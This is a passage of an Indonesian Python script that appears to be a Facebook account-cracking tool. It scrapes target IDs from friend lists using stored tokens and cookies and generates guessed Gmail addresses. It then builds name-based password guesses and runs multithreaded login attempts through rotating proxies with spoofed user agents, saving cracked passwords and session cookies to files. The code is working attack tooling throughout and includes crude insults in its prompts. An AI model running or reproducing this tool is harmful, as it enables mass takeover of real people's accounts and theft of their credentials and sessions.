			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
		if "Lihat Hasil Selanjutnya" in x.text:
			cari_nama("https://mbasic.facebook.com"+x.get("href"),cokies)
			
	
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = [" ranti"," rindu"," duda"," janda"," montok"," tepos"," caca"," cantik"," ganteng"," jancok"," batam"," papua"," crish"," erma"," yanti"]
	blk = ['tika','milla','brayen','gabriel','lala','cans','nayla','pandi','miftah','kurnia','sinta','nadia','gadis','anggun','amoy','anna']
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' [+] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
	jumlah = console.input(f' [+] Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,10000))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,10000))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,10000))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = f'@gmail.com'
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		exit()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		exit()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s [ %s Idz ]'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s [ %s Idz] '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol ')
			time.sleep(3)
			exit()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			exit()
		for xid in lin:
			id.append(xid)
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(3)
			exit()
		if len(vin)==0:
			print(' [+] Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			exit()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(4)
			exit()
		if len(vin)==0:
			print(' [+] Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n [+] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}User-Agent : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			exit()
	else:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def brayen_dump():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
	pil = input(f' [+] Masukan ID Target : ')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f' [+] Total ID Yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' [+] Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' [+] Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
		jum = int(input(f' [+] Mau Berapa Idz Target  : '))
	except ValueError:
		print(' [+] Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [+] Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' [+] Masukan Idz Target Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' [+] Unstable Signal ')
			exit()
	try:
		print(f' [+] Total Idz Target Yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'')
		print(' [+] Unstable Signal ')
		exit()
	except (KeyError,IOError):
		print(f' [+] Pertemanan Tidak Public ')
		time.sleep(3)
		exit()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	hu = input(f' [+] Pilih Urutan Idz : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' [+] Pilih Yang Bener Kontooll ')
		exit()
	urut = []
	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]',width=42,title=f"[bold green]Validate",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]graph.facebook.com[bold white]',width=42,title=f"[bold green]Reguler And B-Api[bold white]",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]async.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]m.alpha.facebook.com[bold white] ',width=42,title=f"[bold green]Alpha And Async",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=42,title=f"[bold green]Old Metode",style=f"bold white"))
	console.print(Columns(urut))
	hc = input(f' [+] Pilih Metode : ')
	if hc in ['1','01']:
		method.append('validate1')
	elif hc in ['2','02']:
		method.append('validate2')
	elif hc in ['3','03']:
		method.append('reguler1')
	elif hc in ['4','04']:
		method.append('reguler2')
	elif hc in ['5','05']:
	    method.append('kontol')
	elif hc in ['6','06']:
	    method.append('bapi')
	elif hc in ['7','07']:
	    method.append('colmek1')
	elif hc in ['8','8']:
	    method.append('colmek2')
	else:
		method.append('validate1')
	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
[bold white][[bold cyan]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
	pwplus=input(f' [+] {P}Pilih Sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' [+] Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
	_brayen_ = input(' [+] Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	elif _brayen_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold white"))
	_brayen_ = input(' [+] Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	elif _brayen_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
	
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
	uatambah = input(f' [+] Pilih : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' [+] Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
	wa.print(Columns(urut))
	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append('katasandi')
						pwv.append('kontol')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate1' in method:
					pool.submit(validate1,idf,pwv)
				elif 'validate2' in method:
					pool.submit(validate2,idf,pwv)
				elif 'reguler1' in method:
					pool.submit(reguler1,idf,pwv)
				elif 'reguler2' in method:
					pool.submit(reguler2,idf,pwv)
				elif 'bapi' in method:
					pool.submit(bapi,idf,pwv)
				elif 'kontol' in method:
					pool.submit(kontol,idf,pwv)
				elif 'colmek1' in method:
					pool.submit(colmek1,idf,pwv)
				elif 'colmek2' in method:
					pool.submit(colmek2,idf,pwv)
				else:
					pool.submit(validate1,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [+] OK : {H}{ok} ')
	print(f'  [+] CP : {K}{cp} ')

#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Validate V1[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Validate V2[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
